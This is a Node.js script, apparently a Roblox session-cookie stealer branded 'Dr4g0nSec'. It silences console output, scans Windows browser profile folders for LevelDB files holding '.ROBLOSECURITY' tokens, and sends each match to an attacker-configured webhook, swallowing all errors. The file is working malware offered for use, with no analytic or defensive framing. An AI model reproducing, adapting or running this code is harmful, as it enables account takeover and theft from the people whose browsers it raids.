console.log = console.error = console.warn = console.info = () => {};
const fs = require('fs');
const path = require('path');
const glob = require('glob');
const axios = require('axios');
const os = require('os');

const H00K3_URL = "%WEBHOOK%";

function extractCookies(cookiePath) {
    const files = glob.sync(path.join(cookiePath, '*.ldb'));
    const cookies = [];

    for (const file of files) {
        try {
            const content = fs.readFileSync(file);
            cookies.push(content.toString());
        } catch (e) {}
    }

    return cookies;
}

async function sendWebhook(cookie, platform, webhookUrl) {
    const data = {
        username: "<:dr4g0n:1362932398102155475> Dr4g0nSec | Roblox Info <:dr4g0n:1362932398102155475>",
        avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
        embeds: [
            {
                title: "🍪 Roblox Info",
                color: 0x250e80,
                fields: [
                    {
                        name: "Plataforma:",
                        value: `\`\`\`${platform}\`\`\``,
                        inline: false
                    },
                    {
                        name: "Cookie:",
                        value: `\`\`\`${cookie}\`\`\``,
                        inline: false
                    }
                ],
                footer: {
                    text: "Created by: sk4rty | Dr4g0nSec on Top!",
                    icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400"
                }
            }
        ]
    };

    try {
        await axios.post(webhookUrl, data);
    } catch (e) {}
}

async function sendErrorWebhook(webhookUrl) {
    const data = {
        username: "Dr4g0nSec | Roblox Info",
        avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
        embeds: [
            {
                title: "❌ Erro ao encontrar cookies",
                color: 0xFF0000,
                fields: [
                    {
                        name: "Erro:",
                        value: "``Nenhuma cookie foi encontrada.``",
                        inline: false
                    }
                ],
                footer: {
                    text: "Created by: sk4rty | https://github.com/sk4rtyxz",
                    icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400"
                }
            }
        ]
    };

    try {
        await axios.post(webhookUrl, data);
    } catch (e) {}
}

async function extractAndSendCookies(webhookUrl) {
    const localAppData = process.env.LOCALAPPDATA;
    const appData = process.env.APPDATA;

    const browsers = {
        'Firefox': path.join(appData, 'Mozilla\\Firefox\\Profiles'),
        'Safari': path.join(appData, 'Apple Computer\\Safari'),
        'Chromium': path.join(appData, 'Chromium\\User Data'),
        'Microsoft Edge': path.join(localAppData, 'Microsoft\\Edge\\User Data'),
        'Opera GX': path.join(localAppData, 'Opera Software\\Opera GX Stable'),
        'Opera': path.join(appData, 'Opera Software\\Opera Stable'),
        'Brave': path.join(localAppData, 'BraveSoftware\\Brave-Browser\\User Data'),
        'Chrome': path.join(localAppData, 'Google\\Chrome\\User Data')
    };

    let foundCookie = false;

    for (const [browserName, browserPath] of Object.entries(browsers)) {
        const cookiePaths = glob.sync(path.join(browserPath, '*\\Network'));

        for (const cookiePath of cookiePaths) {
            const cookies = extractCookies(cookiePath);
            for (const cookie of cookies) {
                if (cookie.includes('.ROBLOSECURITY')) {
                    await sendWebhook(cookie, browserName, webhookUrl);
                    foundCookie = true;
                }
            }
        }
    }

    if (!foundCookie) {
        await sendErrorWebhook(webhookUrl);
    }
}

(async () => {
    await extractAndSendCookies(H00K3_URL);
})();
